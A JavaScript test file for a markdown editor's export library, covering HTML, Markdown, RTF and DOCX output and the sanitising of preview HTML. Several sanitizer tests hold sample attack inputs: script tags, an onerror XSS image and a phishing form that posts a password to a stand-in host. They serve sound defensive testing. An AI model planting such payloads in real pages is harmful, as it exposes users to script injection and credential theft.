import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { JSDOM } from "jsdom";
import {
  GENERATOR_URL,
  buildHtmlDocument,
  buildMarkdownFile,
  buildRtfDocument,
  buildDocxBlob,
  cleanPreviewHtml,
  exportBasename,
  exportStyleOptionsFromPreview,
} from "../../src/lib/export.js";

describe("exportBasename", () => {
  it("slugifies titles and falls back to markdown", () => {
    assert.equal(exportBasename("Hello World!"), "Hello-World");
    assert.equal(exportBasename(" "), "markdown");
    assert.equal(exportBasename(""), "Untitled");
    assert.equal(exportBasename("a".repeat(70)).length, 60);
  });
});

describe("buildMarkdownFile", () => {
  it("prepends title and generator front matter", () => {
    const out = buildMarkdownFile("# Hello", "My Doc");
    assert.match(out, /^---\n/);
    assert.match(out, /title: My Doc/);
    assert.ok(out.includes(`generator: ${GENERATOR_URL}`));
    assert.match(out, /# Hello/);
  });

  it("leaves existing front matter unchanged", () => {
    const src = "---\ntitle: x\n---\nBody";
    assert.equal(buildMarkdownFile(src, "Irrelevant"), src);
  });
});

describe("buildHtmlDocument", () => {
  it("embeds the body, escaped title, and generator meta", () => {
    const doc = buildHtmlDocument("<p>Hi</p>", "Test");
    assert.match(doc, /<!DOCTYPE html>/);
    assert.match(doc, /<title>Test<\/title>/);
    assert.match(doc, /<p>Hi<\/p>/);
    assert.ok(doc.includes(GENERATOR_URL));
    assert.match(buildHtmlDocument("", "<script>"), /&lt;script&gt;/);
  });

  it("defaults to readable width", () => {
    const doc = buildHtmlDocument("<p>Hi</p>", "Test");
    assert.match(doc, /data-width="readable"/);
    assert.match(doc, /max-width:\s*52rem/);
  });

  it("respects full width and theme tokens from options", () => {
    const doc = buildHtmlDocument("<p>Hi</p>", "Test", {
      width: "full",
      lineWrap: false,
      theme: "github-dark",
      vars: {
        "--color-scheme": "dark",
        "--preview-bg": "#0d1117",
        "--preview-fg": "#e6edf3",
        "--preview-link": "#58a6ff",
      },
    });
    assert.match(doc, /data-theme="github-dark"/);
    assert.match(doc, /data-width="full"/);
    assert.match(doc, /data-line-wrap="off"/);
    assert.match(doc, /max-width:\s*none/);
    assert.match(doc, /--preview-bg:\s*#0d1117/);
    assert.match(doc, /--preview-fg:\s*#e6edf3/);
    assert.match(doc, /color-scheme" content="dark"/);
  });

  it("embeds Salesforce preview chrome overrides", () => {
    const doc = buildHtmlDocument("<p>Hi</p>", "Test", { theme: "salesforce" });
    assert.match(doc, /data-theme="salesforce"/);
    assert.match(doc, /background:\s*#eaf5fe/);
    assert.match(doc, /color:\s*#014486/);
  });
});

describe("exportStyleOptionsFromPreview", () => {
  it("reads width, line wrap, and theme vars from the live preview", () => {
    const { window: win } = new JSDOM(
      `<!DOCTYPE html><html data-theme="github-dark" data-line-wrap="off" style="--preview-bg:#0d1117;--preview-fg:#e6edf3;--color-scheme:dark"><body><article id="preview" data-width="full"></article></body></html>`,
      { url: "https://example.test/" },
    );
    // jsdom getComputedStyle does not resolve stylesheet custom props from
    // inline style on <html> the same way browsers do; set properties directly.
    win.document.documentElement.style.setProperty("--preview-bg", "#0d1117");
    win.document.documentElement.style.setProperty("--preview-fg", "#e6edf3");
    win.document.documentElement.style.setProperty("--color-scheme", "dark");
    const previousWindow = globalThis.window;
    const previousGetComputedStyle = globalThis.getComputedStyle;
    globalThis.window = /** @type {Window} */ (/** @type {unknown} */ (win));
    globalThis.getComputedStyle = win.getComputedStyle.bind(win);
    try {
      const preview = win.document.getElementById("preview");
      const opts = exportStyleOptionsFromPreview(/** @type {HTMLElement} */ (preview));
      assert.equal(opts.width, "full");
      assert.equal(opts.lineWrap, false);
      assert.equal(opts.vars["--preview-bg"], "#0d1117");
      assert.equal(opts.vars["--preview-fg"], "#e6edf3");
      assert.equal(opts.vars["--color-scheme"], "dark");
    } finally {
      if (previousWindow === undefined) delete globalThis.window;
      else globalThis.window = previousWindow;
      if (previousGetComputedStyle === undefined) delete globalThis.getComputedStyle;
      else globalThis.getComputedStyle = previousGetComputedStyle;
    }
  });
});

describe("DOM exporters", () => {
  /** @type {Window | undefined} */
  let previousWindow;

  function previewWith(html) {
    const { window: win } = new JSDOM("<!DOCTYPE html><html><body></body></html>", {
      url: "https://example.test/",
    });
    previousWindow = globalThis.window;
    globalThis.window = /** @type {Window} */ (/** @type {unknown} */ (win));
    // export.js walks Node constants via numeric nodeType on the element tree.
    const el = win.document.createElement("article");
    el.innerHTML = html;
    return el;
  }

  function restoreWindow() {
    if (previousWindow === undefined) delete globalThis.window;
    else globalThis.window = previousWindow;
    previousWindow = undefined;
  }

  it("cleans preview chrome from HTML exports", () => {
    try {
      const el = previewWith(
        `<h1 data-source-line="1">Hi</h1><mark class="speech-word">x</mark>` +
          `<button class="md-section-toggle">▼</button><p hidden>slide2</p>` +
          `<div class="mermaid" data-processed="true"><svg data-mermaid-natural="800" data-mermaid-fluid="1"></svg></div>`,
      );
      const html = cleanPreviewHtml(el);
      assert.doesNotMatch(html, /data-source-line/);
      assert.doesNotMatch(html, /speech-word/);
      assert.doesNotMatch(html, /md-section-toggle/);
      assert.doesNotMatch(html, /hidden/);
      assert.doesNotMatch(html, /data-processed/);
      assert.doesNotMatch(html, /data-mermaid-natural/);
      assert.doesNotMatch(html, /data-mermaid-fluid/);
      assert.match(html, /slide2/);
    } finally {
      restoreWindow();
    }
  });

  it("makes fluid Mermaid (gantt) SVGs fill export width", () => {
    try {
      const el = previewWith(
        `<div class="mermaid"><svg data-mermaid-fluid="1" data-mermaid-natural="640" width="640" height="200" viewBox="0 0 640 200" style="max-width: 640px" aria-roledescription="gantt"></svg></div>`,
      );
      const html = cleanPreviewHtml(el);
      assert.match(html, /data-export-fluid/);
      assert.match(html, /width="100%"/);
      assert.doesNotMatch(html, /max-width:\s*640px/);
      assert.doesNotMatch(html, /height="200"/);
    } finally {
      restoreWindow();
    }
  });

  it("keeps gantt weekend bands unstroked in HTML export CSS", () => {
    const doc = buildHtmlDocument("<p>x</p>", "Gantt", {
      theme: "github-dark",
      vars: { "--mermaid-exclude": "#161b22" },
    });
    assert.match(doc, /\.exclude-range\s*\{[^}]*stroke:\s*none/s);
    assert.match(doc, /--mermaid-exclude:\s*#161b22/);
  });

  it("strips scripts and event handlers from export HTML", () => {
    try {
      const el = previewWith(
        `<p>ok</p><script>alert(1)</script><img src=x onerror="alert(1)">`,
      );
      const html = cleanPreviewHtml(el);
      const doc = buildHtmlDocument(html, "Safe");
      assert.doesNotMatch(html, /<script/i);
      assert.doesNotMatch(html, /onerror/i);
      assert.doesNotMatch(doc, /<script/i);
      assert.doesNotMatch(doc, /onerror/i);
      assert.match(html, /ok/);
    } finally {
      restoreWindow();
    }
  });

  it("strips phishing forms from export HTML", () => {
    try {
      const el = previewWith(
        `<p>ok</p><form action="https://evil.example/phish"><input name="p" type="password"><button type="submit">Sign in</button></form>`,
      );
      const html = cleanPreviewHtml(el);
      assert.doesNotMatch(html, /<form/i);
      assert.doesNotMatch(html, /<input/i);
      assert.doesNotMatch(html, /<button/i);
      assert.match(html, /ok/);
    } finally {
      restoreWindow();
    }
  });

  it("keeps Mermaid foreignObject flowchart labels", () => {
    try {
      const el = previewWith(
        `<div class="mermaid"><svg xmlns="http://www.w3.org/2000/svg">` +
          `<foreignObject width="80" height="24">` +
          `<div xmlns="http://www.w3.org/1999/xhtml" class="nodeLabel"><p>Square Rect</p></div>` +
          `</foreignObject></svg></div>`,
      );
      const html = cleanPreviewHtml(el);
      assert.match(html, /foreignObject/i);
      assert.match(html, /Square Rect/);
      assert.match(html, /width="80"/);
    } finally {
      restoreWindow();
    }
  });

  it("still strips scripts inside foreignObject labels", () => {
    try {
      const el = previewWith(
        `<div class="mermaid"><svg xmlns="http://www.w3.org/2000/svg">` +
          `<foreignObject width="80" height="24">` +
          `<div xmlns="http://www.w3.org/1999/xhtml"><p>Safe</p><script>alert(1)</script></div>` +
          `</foreignObject></svg></div>`,
      );
      const html = cleanPreviewHtml(el);
      assert.match(html, /Safe/);
      assert.doesNotMatch(html, /<script/i);
    } finally {
      restoreWindow();
    }
  });

  it("builds RTF with info block and generator", () => {
    try {
      const el = previewWith("<p>Hello</p>");
      const rtf = buildRtfDocument(el, "Doc");
      assert.match(rtf, /\{\\info/);
      assert.match(rtf, /Hello/);
    } finally {
      restoreWindow();
    }
  });

  it("builds a DOCX zip starting with PK", async () => {
    try {
      const el = previewWith("<p>Hello</p>");
      const blob = buildDocxBlob(el, "Doc");
      const buf = new Uint8Array(await blob.arrayBuffer());
      assert.equal(String.fromCharCode(buf[0], buf[1]), "PK");
    } finally {
      restoreWindow();
    }
  });
});
